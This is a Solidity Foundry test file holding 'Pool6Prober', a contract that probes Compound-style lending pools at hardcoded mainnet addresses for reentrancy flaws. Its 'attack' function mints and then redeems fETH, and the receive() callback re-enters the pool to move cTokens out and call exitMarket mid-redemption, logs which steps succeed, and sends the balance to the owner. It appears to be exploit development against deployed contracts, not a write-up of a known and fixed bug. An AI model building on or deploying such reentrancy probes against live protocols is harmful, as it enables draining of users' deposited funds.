// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IComptroller {
    function enterMarkets(address[] calldata) external returns (uint256[] memory);
    function exitMarket(address) external returns (uint256);
    function getAccountLiquidity(address) external view returns (uint256, uint256, uint256);
}

interface ICEther {
    function mint() external payable;
    function redeem(uint256) external returns (uint256);
    function redeemUnderlying(uint256) external returns (uint256);
    function getCash() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function borrow(uint256) external returns (uint256);
    function transfer(address dst, uint256 amount) external returns (bool);
}

interface ICErc20 {
    function mint(uint256) external returns (uint256);
    function borrow(uint256) external returns (uint256);
    function getCash() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

contract Pool6Prober {
    address constant COMP6 = 0x814b02C1ebc9164972D888495927fe1697F0Fb4c;
    address constant F6_ETH = 0xF6551C22276b9Bf62FaD09f6bD6Cad0264b89789;
    
    // Pool 3 - different comptroller!
    address constant COMP3 = 0x6E7fb6c5865e8533D5ED31b6d43fD95f4C411834;
    address constant F3_ETH = 0x95FD9Ac18D72C84D47442181828202b9ec8419C6;

    address payable public owner;
    bool public inRedeem;
    
    string public result1;
    string public result2;
    string public result3;
    string public result4;

    constructor() { owner = payable(msg.sender); }

    function attack() external payable {
        // Supply ETH to Pool 6
        ICEther(F6_ETH).mint{value: msg.value}();
        
        // Enter fETH market  
        address[] memory m = new address[](1);
        m[0] = F6_ETH;
        IComptroller(COMP6).enterMarkets(m);

        inRedeem = true;
        ICEther(F6_ETH).redeemUnderlying(msg.value / 2);
        inRedeem = false;
        
        console.log("R1:", result1);
        console.log("R2:", result2);
        console.log("R3:", result3);
        console.log("R4:", result4);
        
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    receive() external payable {
        if (!inRedeem || msg.sender != F6_ETH) return;
        console.log("=== CALLBACK ===");
        console.log("fETH balance:", ICEther(F6_ETH).balanceOf(address(this)));

        // Test 1: Cross-pool borrow (Pool 3 CEther - unpaused, 44 ETH)
        // Pool 3 has a different comptroller, so different reentrancy state
        {
            // First need to enter Pool 3
            address[] memory m3 = new address[](1);
            m3[0] = F6_ETH; // Can't use Pool 6 fETH as collateral in Pool 3
            // Actually we need collateral IN Pool 3. We'd need to enter markets there.
            // This won't work directly - skip
            result1 = "skipped-need-collateral-in-pool3";
        }

        // Test 2: Transfer fETH cTokens OUT during callback
        {
            (bool ok, bytes memory data) = F6_ETH.call(
                abi.encodeWithSignature("transfer(address,uint256)", owner, uint256(1))
            );
            if (ok && data.length > 0) {
                bool success = abi.decode(data, (bool));
                result2 = success ? "transfer-ok" : "transfer-returned-false";
            } else {
                result2 = "transfer-reverted";
            }
            console.log("Transfer result:", result2);
        }
        
        // Test 3: exitMarket
        {
            (bool ok, bytes memory data) = COMP6.call(
                abi.encodeWithSignature("exitMarket(address)", F6_ETH)
            );
            if (ok && data.length > 0) {
                uint256 code = abi.decode(data, (uint256));
                result3 = code == 0 ? "exit-ok" : "exit-failed-code";
                console.log("Exit code:", code);
            } else {
                result3 = "exit-reverted";
            }
            console.log("Exit result:", result3);
        }
    }
}

contract Pool6ProbeTest is Test {
    function test_probe() external {
        vm.deal(address(this), 110 ether);
        Pool6Prober att = new Pool6Prober();
        att.attack{value: 100 ether}();
    }
    receive() external payable {}
}
